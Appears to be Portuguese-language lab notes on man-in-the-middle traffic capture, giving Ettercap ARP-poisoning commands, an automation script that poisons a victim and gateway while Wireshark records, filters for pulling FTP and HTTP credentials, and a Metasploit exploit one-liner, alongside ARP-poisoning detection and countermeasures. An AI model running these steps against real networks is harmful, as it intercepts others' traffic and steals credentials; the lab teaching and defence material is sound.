# Network Data Capture com Wireshark e Ettercap

## 🌐 Configuração de Captura de Rede

### 1. Inicialização do Wireshark
```bash
# Iniciar Wireshark como root para captura completa
sudo wireshark

# Alternativa via linha de comando
sudo wireshark -i eth0 -k
```

### 2. Configuração do IP Forwarding
```bash
# Habilitar forwarding de IP para MITM
sudo su
echo 1 > /proc/sys/net/ipv4/ip_forward

# Verificar status
cat /proc/sys/net/ipv4/ip_forward
```

### 3. Ettercap - ARP Poisoning (Interface Gráfica)

#### Passos no Ettercap-GTK:
```bash
# Iniciar Ettercap com interface gráfica
ettercap -G
```

**Fluxo de Operação:**
1. **Scan for Hosts** → Escaneia hosts na rede
2. **Hosts List** → Visualiza hosts descobertos
3. **Add to Target 1** → Vítima (ex: 192.168.56.102)
4. **Add to Target 2** → Gateway (ex: 192.168.56.1)
5. **MITM Menu** → Menu de ataques man-in-the-middle
6. **ARP poisoning** → Selecionar ARP poisoning
7. **Sniff remote connections** → Ativar sniffing

### 4. Comandos Alternativos via Terminal
```bash
# Ettercap via linha de comando
ettercap -T -i eth0 -M arp:remote /192.168.56.102// /192.168.56.1//

# Com filtro específico para credenciais
ettercap -T -i eth0 -M arp:remote /192.168.56.102// /192.168.56.1// -l ettercap.log
```

## 🔍 Filtros Wireshark para Análise

### Filtros Comuns para Captura:
```bash
# Capturar apenas tráfego HTTP
http

# Capturar tráfego FTP (credenciais)
ftp or ftp-data

# Capturar tráfego DNS
dns

# Capturar tráfego entre hosts específicos
ip.addr == 192.168.56.102 and ip.addr == 192.168.56.1

# Capturar pacotes TCP em portas específicas
tcp.port == 80 or tcp.port == 21 or tcp.port == 22

# Capturar credenciais em texto claro
http.request.method == "POST"
```

### Filtros para Detecção de Ataques:
```bash
# Detectar ARP poisoning
arp.duplicate-address-detected or arp.duplicate-address-frame

# Tráfego suspeito de força bruta
tcp.flags.syn == 1 and tcp.flags.ack == 0 and ip.dst == 192.168.56.102

# Múltiplas tentativas de login
tcp.analysis.retransmission or tcp.analysis.duplicate_ack
```

## 📊 Script de Automação para Captura

### Script Completo de Captura:
```bash
nano network_capture.sh
```

**Conteúdo do script:**
```bash
#!/bin/bash

# Configurações
INTERFACE="eth0"
VICTIM_IP="192.168.56.102"
GATEWAY_IP="192.168.56.1"
CAPTURE_FILE="network_capture_$(date +%Y%m%d_%H%M%S).pcap"

echo "[+] Iniciando captura de rede..."
echo "[+] Interface: $INTERFACE"
echo "[+] Arquivo: $CAPTURE_FILE"

# Habilitar IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "[+] IP forwarding habilitado"

# Iniciar Wireshark em background
echo "[+] Iniciando Wireshark..."
wireshark -i $INTERFACE -k -w $CAPTURE_FILE &
WIRESHARK_PID=$!

# Aguardar inicialização
sleep 5

# Iniciar ARP poisoning com ettercap
echo "[+] Iniciando Ettercap ARP poisoning..."
ettercap -T -i $INTERFACE -M arp:remote /$VICTIM_IP// /$GATEWAY_IP// -l ettercap_log.txt &

ETTERCAP_PID=$!

echo "[+] Captura em andamento..."
echo "[+] PIDs: WIRESHARK=$WIRESHARK_PID, ETTERCAP=$ETTERCAP_PID"
echo "[+] Pressione Ctrl+C para parar a captura"

# Aguardar sinal de interrupção
trap 'kill $WIRESHARK_PID $ETTERCAP_PID; echo "[+] Captura finalizada"; exit 0' INT
wait
```

### Execução do Script:
```bash
# Dar permissão de execução
chmod +x network_capture.sh

# Executar como root
sudo ./network_capture.sh
```

## 🎯 Análise de Tráfego Específico

### Captura de Credenciais no Wireshark:
```bash
# Usar filtros diretamente na interface Wireshark
ftp.request.command == "USER" || ftp.request.command == "PASS"
http.request.method == "POST"
```

### Monitoramento de Sessões Meterpreter:
```bash
# Filtros para tráfego Meterpreter
tcp.port == 4444 || tcp.port == 2022 || tcp.port == 2023
```

## 📈 Análise Pós-Captura com Wireshark

### Análise Estatística:
- **Statistics** → **Conversation List** → Visualizar conversas TCP
- **Statistics** → **Protocol Hierarchy** → Hierarquia de protocolos
- **Statistics** → **HTTP** → Estatísticas HTTP

### Exportação de Dados:
- **File** → **Export Objects** → **HTTP** → Exportar arquivos transmitidos
- **File** → **Export Packet Dissections** → Exportar pacotes específicos

### Busca por Padrões:
- **Edit** → **Find Packet** → Buscar por "password", "login", "admin"
- **Analyze** → **Follow** → **TCP Stream** → Analisar sessões completas

## 🛡️ Contramedidas e Detecção

### Detecção de ARP Poisoning:
```bash
# Monitorar tabela ARP
arp -a

# Usar arpwatch para detecção
sudo arpwatch -i eth0

# Verificar inconsistências ARP
arp-scan -l

# Script de detecção
#!/bin/bash
while true; do
    arp -an | grep -v "incomplete"
    sleep 5
done
```

### Proteções Recomendadas:
```bash
# Configurar ARP estático
arp -s 192.168.56.1 AA:BB:CC:DD:EE:FF

# Monitorar com ferramentas de segurança de rede
# Implementar VLANs para segmentação
# Usar HTTPS/SSH sempre que possível
```

## 🔧 Integração com Metasploit

### Captura Durante Exploração:
```bash
# Iniciar Wireshark antes da exploração
sudo wireshark -i eth0 -k -w during_exploit.pcap &

# Executar exploração
msfconsole -q -x "use exploit/...; set rhosts 192.168.56.102; exploit"

# Parar Wireshark após exploração
killall wireshark
```

### Análise do Tráfego de Exploração:
- Abrir arquivo .pcap no Wireshark
- Aplicar filtro: `ip.addr==192.168.56.102`
- Analisar sequência de pacotes TCP
- Verificar payloads transmitidos

## 🎯 Técnicas Avançadas de Captura

### Captura com Filtros Específicos:
```bash
# Iniciar Wireshark com filtro pré-definido
wireshark -i eth0 -f "host 192.168.56.102" -k

# Capturar apenas tráfego de aplicação específica
wireshark -i eth0 -f "port 80 or port 21 or port 22" -k
```

### Análise de Performance:
- Usar **IO Graphs** no Wireshark
- Analisar **Round Trip Time** em estatísticas TCP
- Verificar **Throughput** e padrões de tráfego

---

**⚠️ Nota Legal**: A captura de tráfego de rede deve ser realizada apenas em ambiente controlado com autorização explícita. Em redes de produção, garantir conformidade com políticas de segurança e leis de privacidade aplicáveis.